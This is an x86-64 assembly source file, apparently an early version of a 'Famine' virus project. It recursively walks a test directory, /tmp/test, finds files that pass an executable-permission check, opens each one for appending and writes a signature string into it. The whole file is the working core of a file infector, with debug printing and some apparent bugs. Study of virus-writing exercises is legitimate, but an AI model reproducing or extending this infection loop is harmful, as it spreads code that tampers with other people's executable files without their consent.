section .data
    s_folder db "/tmp/test", 0
    str_inject db "Famine version 0.7 (c)oded jul-0064 by bob", 0
    nl: db 10
    dot db ".", 0
    dotdot db "..", 0

section .bss
    path_buf resb 240
    file_buf resb 240

section .text
    global test
    extern opendir, closedir, readdir
    extern strcmp, strlen

test:
    lea r14, [rel s_folder]

.open_dir:
    mov rdi, r14
    call opendir
    test rax, rax
    je   .exit_func
    mov  r12, rax          ; DIR* = r12

    ; openat(AT_FDCWD, path, O_RDONLY|O_DIRECTORY, 0)
    ; mov     rax, 257
    ; mov     rdi, -100
    ; lea     rsi, [rel dirpath]
    ; mov     rdx, 0x20000
    ; xor     r10, r10
    ; syscall
    ; js      .open_error
    ; mov     r12, rax

.read_loop:
    mov  rdi, r12
    call readdir
    test rax, rax
    je   .close_dir

    mov  r13, rax 

    movzx rdx, word [r13 + 16] ; rdx = d_reclen
    mov rcx, rdx
    sub rcx, 19

    mov  bl, byte [r13 + 18]

    cmp  bl, 8              ; DT_REG
    je   .write_in_file

    cmp  bl, 4              ; DT_DIR
    jne .read_loop

    lea rdi, [r13 + 19]    ; d_name
    lea rsi, [rel dot]
    call strcmp
    cmp rax, 0
    je  .read_loop
    lea rdi, [r13 + 19]
    lea rsi, [rel dotdot]
    call strcmp
    cmp rax, 0
    je  .read_loop

    mov rdi, r14
    call strlen
    mov rbx, rax

    lea rdi, [rel path_buf]
    mov rsi, r14
    mov rcx, rbx
    rep movsb

    mov byte [rdi], '/'
    inc rdi

    lea rsi, [r13 + 19]
    jmp .copy_name

.write_in_file:
    mov rdi, r14
    call strlen
    mov rbx, rax

    lea rdi, [rel file_buf]
    mov r8, rdi
    mov rsi, r14
    mov rcx, rbx
    rep movsb

    mov byte [rdi], '/'
    inc rdi

    lea rsi, [r13 + 19]
    call .copy_name_file

    ; access check type file
    lea rdi, [rel file_buf]
    mov rsi, 1                ; X_OK == 1
    mov rax, 21
    syscall
    cmp rax, 0
    jnz .read_loop

    ; open file RW APPEND
    mov rax, 2
    lea rdi, [rel file_buf]
    mov rsi, 0x442
    mov rdx, 0644
    syscall
    test rax, rax
    js .read_loop

    mov r15, rax ; fd file

    mov rax, 1
    mov rdi, r15
    lea rsi, [rel str_inject]
    mov rdx, 0x2c
    syscall

    mov rax, 3
    mov rdi, r15
    syscall         ; close fd

    ; juste print le file: DEBUG
    mov rdi, r8
    call strlen

    mov  rdi, 1
    mov  rsi, r8
    mov  rdx, rax
    mov  rax, 1
    syscall

    mov  rdi, 1
    lea  rsi, [rel nl]
    mov  rdx, 1
    mov  rax, 1
    syscall

    jmp  .read_loop

.copy_name_file:
    mov al, [rsi]
    mov [rdi], al
    inc rdi
    inc rsi
    test al, al
    jnz .copy_name_file
    ret

.copy_name:
    mov al, [rsi]
    mov [rdi], al
    inc rdi
    inc rsi
    test al, al
    jnz .copy_name

    push r12
    push r13
    push r14

    lea r14, [rel path_buf]
    call .open_dir

    pop r14
    pop r13
    pop r12

    jmp .read_loop

.close_dir:
    mov  rdi, r12
    call closedir

.exit_func:
    ret
